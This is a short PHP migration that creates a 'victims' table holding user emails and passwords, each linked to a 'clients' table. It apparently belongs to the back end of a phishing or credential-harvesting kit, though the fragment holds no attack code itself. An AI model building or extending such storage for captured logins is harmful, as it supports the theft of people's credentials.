<?php
class victims extends Migration {
        
    public function up() {
        $this->create("victims", function($table) {
            $this->query('CREATE TABLE victims (
                id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
                id_client INT NOT NULL,
                user_email VARCHAR(255) NOT NULL,
                password_victim VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (id_client) REFERENCES clients(id)
            )');
            
        });
    }
        
    public function down() {
        $this->dropIfExist("victims");
    }
        
}